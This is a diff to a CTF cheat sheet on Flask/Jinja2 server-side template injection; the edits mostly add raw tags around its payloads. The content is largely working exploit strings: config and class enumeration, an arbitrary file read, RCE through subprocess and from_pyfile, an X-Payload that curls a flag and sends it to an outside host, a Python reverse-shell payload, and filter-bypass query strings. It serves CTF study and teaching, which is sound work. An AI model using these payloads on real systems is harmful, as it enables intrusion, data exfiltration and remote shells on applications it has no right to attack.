@@ -40,74 +40,95 @@ If you want to explore in major details their globals, here are the links to the
 #### Introspection
 You may conduct introspection with the `locals` object using `dir` and `help` to see everything that is available to the template context. You can also use introspection to reach every other application variable.  This [script]({{site.bloburl}}/assets/search.py) written by the [DoubleSigma](https://ctftime.org/writeup/10851) team will traverse over child attributes of request recursively. 
 For example, if you need to reach the blacklisted `config` var you may access it anyway via:
+{% raw %}
 ```
 {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
 ```
-
+{% endraw %}
 ### DoS
 The `request.environ` object is a dictionary of objects related to the server environment. One such item in the dictionary is a method named `shutdown_server` assigned to the key `werkzeug.server.shutdown`. Injecting `''` should be enough to shut down the server.
 
 ### Extract classes from the application
 Get all classes:
+{% raw %}
 ```
 {{ [].class.base.subclasses() }}
 ```
+{% endraw %}
+{% raw %}
 ```
 {{''.class.mro()[1].subclasses()}}
 ```
+{% endraw %}
 
 ### Arbitrary file read
 In our context we can't use `''.__class__` as it is outside of the sandbox. So we need an object which has a class inherited from object. We can then leverage the `<type 'file'>` class to read arbitrary file. While `open` is the built-in function for creating file objects, the file class is also capable of instantiating file objects, and if we can instantiate a file object then we can use methods like `read` to extract the contents.
 This injection will do the trick:
+{% raw %}
 ```
 {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}
 ```
+{% endraw %}
 
 Mind that index numbers may vary (i.e. [4],[40]) according to the environment.
 
 ### Remote code execution
 ##### First method
 By using the `subprocess` class you may issue arbitrary commands. This may be version-dependent:
+{% raw %}
 ```
 {{config.items()[4][1].__class__.__mro__[2].__subclasses__()[229]([\"touch /tmp/test\"], shell=True) }}
 ```
+{% endraw %}
 ##### Second Method
 Luckily, the config object comes with a function `from_pyfile()` which reads, compiles and then executes a python file. We now write arbitrary payloads by passing `request.headers['X-Payload']` to the `write` function and sending the `X-Payload` header:
+{% raw %}
 ```
 GET /{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwn.py','w').write(request.headers['X-Payload'])}}-{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwn.py').read()}}-{{config.from_pyfile('/tmp/pwn.py')}} HTTP/1.1
 Host: chal.ctf.net
 [...]
 X-Payload: import os;a=os.system("curl http://chal:8080/flag > /tmp/pwn.log");os.system("curl http://pequalsnp-team.github.io:8081/{}".format(open("/tmp/pwn.log").read().encode("hex")))
 ```
+{% endraw %}
 You could alternatively use the reverse shell payload from the [pentest monkey's cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
+{% raw %}
 ```
 X-Payload: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
+{% endraw %}
 
 ### Filters bypass
 Generally, if there is a blacklist you can use `request.args.param` to retrieve the value of a new param passed with the querystring. Likewise, you may trim parts of the URL using `request.url[n:]` (e.g.  `{{request[request.url[-6:]]}}&a=config` ).
 I'll report some examples below:
 ##### Bypass the filtering on `__`:
+{% raw %}
 ```
 http://localhost:5000/?exploit={{request[request.args.param]}}&param=__class__
 ```
+{% endraw %}
 #####  Bypass the filtering on `.` or `[]`:
 Using [Jinja2 filters](http://jinja.pocoo.org/docs/2.10/templates/#list-of-builtin-filters) like `|attr()`:
+{% raw %}
 ```
 http://localhost:5000/?exploit={{request|attr(request.args.param)}}&param=__class__
 ```
+{% endraw %}
 Remember that you can always use the `__getitem__` to achieve the same, getting an item by key or index.
 
 ##### Generic blacklist evasion
 - Using the `|join` filter will concatenate a list of strings. Also, multiplication of a string with a number 'n' duplicates it 'n' times. You may use both tricks to get bypass.
 - You can also use the `.getlist()` function to simplify the building of the injection. The function returns a list of all parameters with a given name. In our case we define the name using the l parameter and the content of the list with several a parameters.
+{% raw %}
 ```
 http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
 ```
+{% endraw %}
 - There is another method to concatenate strings and with the `|format` filter. With the same query-string parameters `&a=_` we can form a format string that will result in `__class__`: `%s%sclass%s%s`. The `%s` identifiers will be replaced with the passed string:
+{% raw %}
 ```
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
+{% endraw %}
 - You may also use request.cookies, request.headers, request.environ, request.values to store blacklisted injection values.
 - For string concatenation, have a look-see at the `~` operator. `{{ "Hello " ~ name ~ "!" }}` would return (assuming _name_ is set to `'John'`): `Hello John!`.
 
@@ -118,6 +139,6 @@ http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args
 
 ### Useful links
 - Shrine challenge, TokyoWesterns CTF 2018 [Link](https://ctftime.org/writeup/10851)
-- Exploring SSTI in Flask/Jinja2 [Part 1](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html) | [Part 2](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)
+- Exploring SSTI in Flask/Jinja2 [Part 1](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html) / [Part 2](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)
 - Server-Side Template Injection: RCE for the modern webapp, J. Kettle [PDF Link](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
 - Jinja2 template injection filter bypasses, S. Neef [Link](https://0day.work/jinja2-template-injection-filter-bypasses/)
